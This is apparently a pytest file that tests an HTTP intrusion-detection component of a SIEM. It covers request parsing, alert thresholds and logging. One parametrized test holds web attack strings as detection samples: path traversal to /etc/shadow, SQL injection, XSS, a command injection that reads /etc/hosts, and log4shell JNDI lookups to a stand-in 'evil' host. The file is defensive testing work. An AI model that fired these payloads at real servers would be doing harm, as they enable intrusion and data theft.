import pytest
from opentelemetry._logs import SeverityNumber
from opentelemetry.sdk._logs.export import InMemoryLogRecordExporter
from scapy.layers.inet import IP, TCP
from scapy.packet import Packet, Raw

from my_siem.http.command import HttpConfig, HttpState, HttpWatcher
from my_siem.http.wire import HttpRequest, match_rules, parse_request, parse_response
from my_siem.telemetry import event_logger, make_provider

CLIENT = ("203.0.113.9", 50122)
SERVER = ("10.0.0.1", 80)


def to_server(flags: str, payload: bytes = b"") -> Packet:
    pkt = IP(src=CLIENT[0], dst=SERVER[0]) / TCP(
        sport=CLIENT[1], dport=SERVER[1], flags=flags
    )
    return pkt / Raw(payload) if payload else pkt


def to_client(flags: str, payload: bytes = b"") -> Packet:
    pkt = IP(src=SERVER[0], dst=CLIENT[0]) / TCP(
        sport=SERVER[1], dport=CLIENT[1], flags=flags
    )
    return pkt / Raw(payload) if payload else pkt


def get(target: str, agent: str = "curl/8.5.0") -> bytes:
    return (
        f"GET {target} HTTP/1.1\r\nHost: example.org\r\n"
        f"User-Agent: {agent}\r\nAccept: */*\r\n\r\n"
    ).encode()


def watcher(
    cfg: HttpConfig | None = None,
) -> tuple[HttpWatcher, HttpState, InMemoryLogRecordExporter]:
    exporter = InMemoryLogRecordExporter()
    state = HttpState({})
    out = event_logger(make_provider([exporter]), "test")
    return HttpWatcher(out, state, cfg or HttpConfig()), state, exporter


def test_parses_a_request_and_its_headers() -> None:
    req = parse_request(get("/search?q=1"))

    assert req == HttpRequest("GET", "/search?q=1", "1.1", "example.org", "curl/8.5.0")
    assert req.path == "/search"


@pytest.mark.parametrize(
    "payload", [b"", b"\x16\x03\x01\x02\x00", b"SSH-2.0-OpenSSH\r\n", b"GET /\r\n"]
)
def test_other_payloads_are_not_requests(payload: bytes) -> None:
    assert parse_request(payload) is None


def test_parses_the_status_of_a_response() -> None:
    assert parse_response(b"HTTP/1.1 404 Not Found\r\n") == 404
    assert parse_response(b"<html>HTTP/1.1 200 OK") is None


@pytest.mark.parametrize(
    ("target", "agent", "rule"),
    [
        ("/../../etc/passwd", "curl", "path_traversal"),
        ("/%2e%2e/%2e%2e/etc/shadow", "curl", "path_traversal"),
        ("/item?id=1+UNION+SELECT+password+FROM+users", "curl", "sql_injection"),
        ("/login?u=admin'+or+'1'='1", "curl", "sql_injection"),
        ("/q?s=%3Cscript%3Ealert(1)%3C/script%3E", "curl", "xss"),
        ("/ping?h=127.0.0.1;cat+/etc/hosts", "curl", "command_injection"),
        ("/?x=${jndi:ldap://evil/a}", "curl", "log4shell"),
        ("/", "${jndi:ldap://evil/a}", "log4shell"),
        ("/.env", "curl", "sensitive_file"),
        ("/.git/config", "curl", "sensitive_file"),
        ("/wp-login.php", "curl", "admin_probe"),
        ("/", "Mozilla/5.0 (compatible; Nmap Scripting Engine)", "scanner_user_agent"),
        ("/", "sqlmap/1.7", "scanner_user_agent"),
    ],
)
def test_attack_patterns_are_matched(target: str, agent: str, rule: str) -> None:
    req = parse_request(get(target, agent))
    assert req is not None
    assert rule in match_rules(req)


@pytest.mark.parametrize(
    "target", ["/", "/index.html", "/search?q=select+a+union", "/blog/2026/11/"]
)
def test_ordinary_requests_match_no_rule(target: str) -> None:
    req = parse_request(get(target, "Mozilla/5.0 (X11; Linux x86_64) Firefox/140.0"))
    assert req is not None
    assert match_rules(req) == []


def test_requests_and_responses_are_logged_and_counted() -> None:
    w, state, exporter = watcher()

    w.handle(to_server("S"), 100.0)
    w.handle(to_server("PA", get("/")), 100.1)
    w.handle(to_client("PA", b"HTTP/1.1 404 Not Found\r\n\r\n"), 100.2)
    w.handle(to_client("FA"), 100.3)

    request, response = (r.log_record for r in exporter.get_finished_logs())
    assert request.event_name == "siem.http.request"
    assert request.severity_number is SeverityNumber.INFO
    attrs = dict(request.attributes or {})
    assert attrs["http.request.method"] == "GET"
    assert attrs["url.path"] == "/"
    assert attrs["client.address"] == CLIENT[0]
    assert attrs["http.request.header.host"] == "example.org"
    assert response.event_name == "siem.http.response"
    assert response.severity_number is SeverityNumber.WARN
    assert dict(response.attributes or {})["client.address"] == CLIENT[0]

    snap = state.snapshot()
    assert snap["counts"]["requests"] == 1
    assert snap["status_classes"] == {"4xx": 1}
    assert snap["active_connections"] == []
    assert snap["recent_requests"][0]["target"] == "/"


def test_a_suspicious_request_raises_an_alert() -> None:
    w, state, exporter = watcher()

    w.handle(to_server("PA", get("/.env")), 1.0)

    names = [r.log_record.event_name for r in exporter.get_finished_logs()]
    assert names == ["siem.http.request", "siem.alert.http_suspicious_request"]
    snap = state.snapshot()
    assert snap["rules"] == {"sensitive_file": 1}
    assert snap["recent_alerts"][0]["ip"] == CLIENT[0]


def test_many_not_found_answers_raise_a_scan_alert() -> None:
    w, state, exporter = watcher(HttpConfig(error_threshold=3))

    for t in range(3):
        w.handle(to_client("PA", b"HTTP/1.1 404 Not Found\r\n\r\n"), float(t))

    alert = list(exporter.get_finished_logs())[-1].log_record
    assert alert.event_name == "siem.alert.http_error_scan"
    assert state.snapshot()["counts"]["alerts"] == 1


def test_a_request_flood_raises_an_alert() -> None:
    w, _, exporter = watcher(HttpConfig(request_threshold=5))

    for t in range(5):
        w.handle(to_server("PA", get("/")), float(t))

    alert = list(exporter.get_finished_logs())[-1].log_record
    assert alert.event_name == "siem.alert.http_request_flood"


def test_traffic_on_other_ports_is_ignored() -> None:
    w, state, exporter = watcher(HttpConfig(ports=frozenset({8080})))

    w.handle(to_server("PA", get("/.env")), 1.0)

    assert list(exporter.get_finished_logs()) == []
    assert state.snapshot()["counts"] == {}


@pytest.mark.parametrize("field", ["request_threshold", "error_threshold", "window"])
def test_thresholds_must_be_positive(field: str) -> None:
    with pytest.raises(ValueError):
        HttpConfig(**{field: 0})  # type: ignore[arg-type]
